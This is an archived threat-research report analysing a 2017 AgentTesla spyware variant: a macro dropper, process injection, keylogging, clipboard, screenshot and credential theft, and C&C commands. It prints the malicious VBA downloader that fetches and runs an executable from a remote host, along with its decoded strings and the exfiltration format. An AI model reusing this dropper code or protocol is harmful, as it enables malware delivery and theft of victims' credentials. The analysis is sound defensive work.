{
    "id": "a568ea0d-2e42-4ce5-9d23-15b95e6b7df6",
    "created_at": "2023-01-12T15:00:07.899699Z",
    "updated_at": "2025-03-27T02:05:54.937371Z",
    "deleted_at": null,
    "sha1_hash": "170062984e1e2e50af8ea35de23b56f4906a8fc9",
    "title": "2017-06-28 - In-Depth Analysis of A New Variant of .NET Malware AgentTesla",
    "authors": "",
    "file_creation_date": "2022-05-29T10:40:41Z",
    "file_modification_date": "2022-05-29T10:40:41Z",
    "file_size": 826411,
    "plain_text": "# In-Depth Analysis of A New Variant of .NET Malware AgentTesla\n\n**[blog.fortinet.com/2017/06/28/in-depth-analysis-of-net-malware-javaupdtr](https://blog.fortinet.com/2017/06/28/in-depth-analysis-of-net-malware-javaupdtr)**\n\nJune 28, 2017\n\nThreat Research\n\nBy [Xiaopeng Zhang | June 28, 2017](https://blog.fortinet.com/blog/search?author=Xiaopeng+Zhang)\n\n## Background\n\nFortiGuard Labs recently captured some malware which was developed using the Microsoft\n.Net framework. I analyzed one of them, it's a new variant from AgentTasla family. In this\nblog, I’m going to show you how it is able to steal information from a victim’s machine.\n\nThe malware was spread via a Microsoft Word document that contained an auto-executable\nmalicious VBA Macro. Figure 1 below shows how it looks when it’s opened.\n\n\n-----\n\nFigure 1. When the malicious Word document is opened\n\n### What the VBA code does\n\nOnce you click the “Enable Content” button, the malicious VBA Macro is executed covertly in\nthe background. The code first writes some key values into the device’s system registry to\navoid the Macro security warning when opening Word documents with risky content the next\ntime.\n\nHere are the key values it writes into system registry:\n\n_HKCU\\Software\\Microsoft\\Office\\{word version}\\Word\\Security\\,AccessVBOM, dword,_\n_1_\n\n_HKCU\\Software\\Microsoft\\Office\\{word version}\\Word\\Security\\,VBAWarning, dword, 1_\n\n\n-----\n\nFigure 2. Writing two key values into the system registry\n\nOnce that task is completed, it re-opens this Word document in a new Word program\ninstance and exits. The Macro is executed again, but this time it follows a different code\nbranch. The main purpose of the Macro executed in the new Word program instance is to\ndynamically extract a new VBA function (ljRIpdKkSmQPMbnLdh) and get it called.\n\nLet’s take a look at this function:\n\n\n-----\n\n```\nSub ljRIpdKkSmQPMbnLdh()\n  Dim dmvAQJch As String\n  Dim JWyaIoTHtZaFG As String\n  Dim TrbaApjsFydVkOGwjnzkpOB As String\n  dmvAQJch = CreateObject(ThisDocument.bQYHDG(\"66627281787F833D6277747B7B\",\n15)).ExpandEnvironmentStrings(ThisDocument.bQYHDG(\"3463747C7F34\", 15))\n  JWyaIoTHtZaFG = ThisDocument.bQYHDG(\"6B\", 15)\n  TrbaApjsFydVkOGwjnzkpOB = ThisDocument.bQYHDG(\"797085823D748774\", 15)\n  dmvAQJch = dmvAQJch + JWyaIoTHtZaFG + TrbaApjsFydVkOGwjnzkpOB\n  Dim cllbWRRTqqWoZebEpYdGmnPBLAx As String\n  cllbWRRTqqWoZebEpYdGmnPBLAx =\nThisDocument.bQYHDG(\"7783837F493E3E43443D46463D42443D4142483E403E837E7370883D7487\n15)\n  Dim OhYBGFWMcPWNnpvvuTeitVAK As Object\n  Set OhYBGFWMcPWNnpvvuTeitVAK =\nCreateObject(ThisDocument.bQYHDG(\"5C7872817E827E75833D675C5B5763635F\", 15))\n  OhYBGFWMcPWNnpvvuTeitVAK.Open ThisDocument.bQYHDG(\"565463\", 15),\ncllbWRRTqqWoZebEpYdGmnPBLAx, False\n  OhYBGFWMcPWNnpvvuTeitVAK.send\n  If OhYBGFWMcPWNnpvvuTeitVAK.Status = 200 Then\n    Dim BIPvJqwtceisuIuipCzbpsWRuhRwp As Object\n    Set BIPvJqwtceisuIuipCzbpsWRuhRwp =\nCreateObject(ThisDocument.bQYHDG(\"50535E53513D62838174707C\", 15))\n    BIPvJqwtceisuIuipCzbpsWRuhRwp.Open\n    BIPvJqwtceisuIuipCzbpsWRuhRwp.Type = 1\n    BIPvJqwtceisuIuipCzbpsWRuhRwp.Write\nOhYBGFWMcPWNnpvvuTeitVAK.responseBody\n    BIPvJqwtceisuIuipCzbpsWRuhRwp.SaveToFile dmvAQJch, 2\n\n```\n\n-----\n\n```\n       BIPvJqwtceisuIuipCzbpsWRuhRwp.Close\n     End If\n     If Len(Dir(dmvAQJch)) <> 0 Then\n       Dim TGoCeWgrszAukk\n       TGoCeWgrszAukk = Shell(dmvAQJch, 0)\n     End If\n   End Sub\n\n```\nAll key words in this function are encoded. Here they are after decoding:\n```\n   bQYHDG(\"66627281787F833D6277747B7B\", 15) => “WScript.Shell”\n   bQYHDG(\"3463747C7F34\", 15) => “%Temp%”\n   bQYHDG(\"797085823D748774\", 15) => “javs.exe”\n   bQYHDG(\"7783837F493E3E43443D46463D42443D4142483E403E837E7370883D748774\", 15) =>\n   “hxxp://45.77.35.239/1/today.exe”\n   bQYHDG(\"5C7872817E827E75833D675C5B5763635F\", 15) => “Microsoft.XMLHTTP”\n   bQYHDG(\"565463\", 15) => “Get”\n\n```\nAs you may have realized from the highlighted keywords, this malware is designed to\ndownload an executable file and run it by calling the “Shell” function. Indeed, it downloads\nthe file “today.exe” to “%Temp%\\javs.exe”, and runs it.\n\n### The downloaded exe file\n\n\n-----\n\nFigure 3. Detailed information of the downloaded javs.exe file\n\nFrom the analysis result of the PE analysis tool in Figure 3, we know that the downloaded\n“javs.exe” was built with .Net Framework. Looking at its icon, it is easy to assume that this is\na pdf related file. But it’s not. This is simply a deception used to confuse the victim.\n\nOnce executed, it starts another process by calling the function CreateProcessA with the\nCREATE_SUSPENDED flag. This procedure could allow the memory of the second process\nto be modified by calling the function WriteProcessMemory. Finally, the process is restored to\nrun by calling the functions SetThreadContext and ResumeThread.\n\nFigure 4, below, shows how CreateProcessA is called.\n\n\n-----\n\nFigure 4. javs.exe calls CreateProcessA\n\nThrough my analysis, I was able to determine that the data being injected into the second\nprocess by calling WriteProcessMemory is another executable file. This file was decoded\nfrom a BMP resource in the first javs.exe process. Interestingly, the injected executable was\nalso built with .Net framework.\n\nAs you may know, the .Net program only contains complied bytecode. This code can only be\nparsed and executed in its .Net CLR virtual machine. As a result, debugging a .Net program\nusing the usual Ollydbg or Windbg tools is a challenge. So I had to determine which other\nanalysis tools would work.\n\n## Analysis of the second .Net program\n\nFrom the above analysis, I was able to determine that the second .Net program had been\ndynamically decoded from the javs.exe process memory. So the next challenge was\ncapturing its entire data and saving it as an exe file for analysis. To do that, I used the\nmemory tool to dump it directly from the second process memory. Figure 5 shows what the\ndumped file looks like in the analysis tool.\n\n\n-----\n\nFigure 5. Dumped memory file in analysis tool\n\nThe “File is corrupted” warning obviously occurs because the dumped file’s PE header was\nwrong. I manually repaired the PE header using a sort of unpacking technique. After that,\nthe dumped file could be recognized, statically analyzed, and debugged. In Figure 6 below,\nyou can see the repaired file was recognized as a .Net assembly, and you even can see\n.NET Directory information in CFF Explorer.\n\n\n-----\n\nFigure 6. Repaired dump file in analysis tool\n\nThe author of the malware used some anti-analysis techniques to prevent it from being\nanalyzed. For example, obfuscation is used to make the function names and variable names\ndifficult to understand, and encoding is used to hide key words and data so analysts have a\nhard time understanding what it is trying to do. The repaired .Net program even causes the\nstatic analysis tool .NET Reflector to not work because the names of classes, functions, and\nvariables are unreadable. From Figure 7 below, you can see what the code looks like using\nthese techniques.\n\n\n-----\n\nFigure 7. The Main function with anti-analysis techniques\n\nTo better analyze the malware, I tried to rename parts of the unreadable names. So please\nnote that in the following analysis the unreadable names in the referred code have been\nrenamed to readable names.\n\nOk, at this point we are finally ready to do the analysis. Let’s get started to see what is going\nto happen.\n\n## Analysis of the .Net malware\n\nOnce executed, it goes through the current running processes to kill any duplicate processes\nfound. It then sends “uninstall” and “update” commands to the C&C server. If the response to\nthe “uninstall” command from the server contains an “uninstall” string, it cleans up the\ninformation it has written on the victim’s machine and exits. When I ran the malware, no\n“uninstall” string was contained in the response, so I could proceed with the analysis. The\nfollowing two Figures show you how the “update” command is sent to the C&C server.\n\n\n-----\n\nFigure 8. Sending “update” command to C&C server\n\nFigure 9. Function used to send data to the C&C server\n\nFrom Figure 9, we learn that the URL of the C&C server is\n“hxxp://www.vacanzaimmobiliare.it/testla/WebPanel/post.php”, which was decrypted in the\n“SendToCCServer” function. The HTTP method is “POST”, which was also decrypted.\n\n\n-----\n\nNext, it copies itself from %temp%\\javs.exe to %appdata%\\Java\\JavaUpdtr.exe . In this\nway it disguises itself by looking like an update program for Java. It then writes the full path\ninto the value \"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load\" in the system\nregistry so that “JavaUpdtr.exe” can be executed automatically when the system starts.\n\nThe code snippet below shows us how the full path to “JavaUpdtr.exe” is defined.\n```\n   private static string appdata_Java_JavaUpdtr.exe =\n   Environment.GetEnvironmentVariable(\"appdata\") + \"\\\\Java\\\\JavaUpdtr.exe\";\n\n```\nThis malware can record the victim’s keyboard inputs, steal data from the system clipboard\nwhen its content changes, capture screenshots of the victim’s system screen, and collect\ncredentials from installed software that the malware is interested in. To complete these tasks,\nit creates a variety of threads and timers.\n\nIn the following sections I’ll discuss them in detail.\n\n## Stealing keyboard inputs, system clipboard contents, and screen shots\n\nBefore the Main function is called, three hook objects are defined in the construction function\nof the main class. These are used for hooking the Keyboard, Mouse, and Clipboard. It then\nsets hook functions for all of them so that when victim inputs something by keyboard, or\nwhen the clipboard data is changed (Ctrl+C), the hook functions will be called first. Figure 10\nshows part of the hook function of the key down event.\n\n\n-----\n\nFigure 10. Key “down” event hook function\n\nIn this function, it first grabs the Window title where the victim types in and puts it into an html\ncode. Next, it captures which key the victim presses, and converts the key code string into an\nhtml code. For example, “ \". As you can\nsee, the html code is concatenated to the variable\n“pri_string_saveAllStolenKey_Clipboard_Data”. Note: I modified the name to be readable.\n\nIn the hook function for the system clipboard, it goes through a similar process. It captures\nthe clipboard content every time the clipboard content is changed (e.g press Ctrl+C, Ctrl+X,\netc.) by calling the function Clipboard.GetText(). It then puts the collected data into an html\ncode, and again concatenates it to the variable\n“pri_string_saveAllStolenKey_Clipboard_Data”. Figure 11 is the code snippet of this function.\n\n\n-----\n\nFigure 11. Clipboard change event hook function\n\nIt also creates a timer whose function is called every 10 minutes. In the timer function, it\ncaptures screenshots of the victim’s screen and then uses the API\n“Graphics::CopyFromScreen” to grab the screenshots and saves them into the file\n“%appdata%\\ScreenShot\\screen.jpeg”. It later encodes the file screen.jpeg with base64 and\nthen sends it to its C&C server using the command “screenshots”.\n\nIt keeps taking screenshots every 10 minutes and sends them to the C&C server so the\nmalware author can see what the victim is doing. Figure 12 shows the malware sending out\na screen.jpeg file by calling the sending function.\n\nFigure 12. Sending out a screenshot file\n\n## Stealing the credentials of installed software\n\n\n-----\n\nAt the end of the Main function, it creates another thread whose function is to collect\ncredentials from a variety of software on the victim’s machine. It can collect user credentials\nfrom the system registry, local profile files, SQLite database files, and so on. Once it has\ncaptured the credentials of one the software packages it is looking for, it immediately sends it\nto the C&C server. One HTTP packet contains the credentials of one software package.\n\nBased on my analysis, this malware is able to obtain the credentials from the following\nsoftware.\n\n### Browser clients:\n\nGoogle Chrome, Mozilla Firefox, Opera, Yandex, Microsoft IE, Apple Safari, SeaMonkey,\nComodoDragon, FlockBrowser, CoolNovo, SRWareIron, UC browser, Torch Browser.\n\n### Email clients:\n\nMicrosoft Office Outlook, Mozilla Thunderbird, Foxmail, Opera Mail, PocoMail, Eudora,\nTheBat!.\n\n### FTP clients:\n\nFileZilla, WS_FTP, WinSCP, CoreFTP, FlashFXP, SmartFTP, FTPCommander.\n\n### Dynamic DNS:\n\nDynDNS, No-IP.\n\n### Video chatting:\n\nPaltalk, Pidgin.\n\n### Download management:\n\nInternet Download Manager, JDownloader.\n\nIn my test environment, I installed Microsoft Office Outlook with a Gmail account. Figure 13\nshows what Outlook data is sent to the C&C server.\n\n\n-----\n\nFigure 13. Sending the captured credentials of Microsoft Office Outlook\n\n## C&C command format\n\nBelow is the C&C command format string.\n\n\"type={0}&hwid={1}&time={2}&pcname={3}&logdata={4}&screen={5}&ipadd={6}&wbscreen=\n{7}&client={8}&link={9}&username={10}&password={11}&screen_name={12}\"\n\nNext, I will explain the meaning of each field.\n\n\"type\" holds the command name; \"hwid\" is the hardware id; \"time\" is the current date and\ntime; \"pcname\" consists of the user name and computer name; \"logdata\" consists of key log\nand clipboard data; \"screen\" is base64 encoded screen.jpeg file content; \"ipadd\" is not used;\n\"wbscreen\" consists of picture content from the camera; \"client\" is the name of the software;\n\"link\" is the software’s website; \"username\" is the logon user name; \"password\" is the logon\npassword; \"screen_name\" is not used .\n\nIn the table below, all the C&C commands (type field) that the malware supports are listed.\n\nCommand Comment\n\nuninstall Ask the server if exit itself\n\nupdate Send the server updates of victim’s device\n\ninfo Send the server victim’s system information\n\nwebcam Send image files from victim’s camera if have\n\n\n-----\n\nscreenshots Send screenshot of victim’s screen\n\nkeylog Send the server recorded key inputs and clipboard data\n\npasswords Send collected credentials from some software\n\n## Other features\n\nThrough my analysis I was able to determine that this is a spyware designed to collects a\nvictim’s system information, and continually record the victim’s keyboard inputs, changes to\nthe system clipboard, as well as capture the credentials of a number of popular software\ntools. Finally, it sends all the collected data to its C&C server.\n\nHowever, by carefully going through the decompiled *.cs files, I was able to discover some\nadditional features built into this malware that are not currently used. They include:\n\nUsing the SMTP protocol to communicate with the server instead of HTTP.\nObtaining system hardware information, including processor, memory, and video card.\nEnabling the collection of images from victim’s camera.\nRestarting the system after adding “JavaUptr.exe” to the startup group in the system\nregistry.\nKilling any running analysis processes, AV software, or Keylogger software, etc.\n\nThere is the possibility that these features will be used in future versions.\n\n## Solution\n\nThe Word sample is detected as “WM/Agent.DJO!tr.dldr”, and Javs.exe has been detected\nas “MSIL/Generic.AP.EA826!tr” by FortiGuard AntiVirus service.\n\nThe URL of the C&C server has been detected as “Malicious Websites” by FortiGuard\nWebFilter service.\n\n## IoC:\n\n URL:\n\n45.77.35.239/1/today.exe\n\nwww.vacanzaimmobiliare.it/testla/WebPanel/post.php\n\n\n-----\n\n## Sample SHA256:\n\nYachtworld Invoice Outstanding.doc\n\n_1A713E4DDD8B1A6117C10AFE0C45496DFB61154BFF79A6DEE0A9FFB0518F33D3_\n\nJavs.exe\n\n_5D4E22BE32DCE5474B61E0DF305861F2C07B10DDADBC2DC937481C7D2B736C81_\n\n### Related Posts\n\nCopyright © 2022 Fortinet, Inc. All Rights Reserved\n\n[Terms of ServicesPrivacy Policy](https://www.fortinet.com/corporate/about-us/legal.html)\n| Cookie Settings\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-06-28 - In-Depth Analysis of A New Variant of .NET Malware AgentTesla.pdf"
    ],
    "report_names": [
        "2017-06-28 - In-Depth Analysis of A New Variant of .NET Malware AgentTesla.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535607,
    "ts_updated_at": 1743041154,
    "ts_creation_date": 1653820841,
    "ts_modification_date": 1653820841,
    "files": {
        "pdf": "https://archive.orkl.eu/170062984e1e2e50af8ea35de23b56f4906a8fc9.pdf",
        "text": "https://archive.orkl.eu/170062984e1e2e50af8ea35de23b56f4906a8fc9.txt",
        "img": "https://archive.orkl.eu/170062984e1e2e50af8ea35de23b56f4906a8fc9.jpg"
    }
}